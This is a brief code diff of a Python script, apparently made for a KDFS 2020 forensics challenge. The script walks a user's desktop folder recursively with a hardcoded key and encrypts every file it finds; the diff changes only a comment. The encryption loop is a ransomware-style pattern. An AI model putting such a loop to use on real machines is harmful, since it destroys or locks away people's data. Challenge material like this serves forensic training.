@@ -32,7 +32,8 @@ key = b'key is KDFS 2020'
 
 startPath = 'C:/Users/cloua/Desktop/KDFS2020/빈/**' 
 
-#Encrypts all files recursively starting from startPath
+#Encrypts all files recursively starting from startPath::
+
 for filename in glob.iglob(startPath, recursive=True):
     if(os.path.isfile(filename)):
         print('Encrypting> ' + filename)
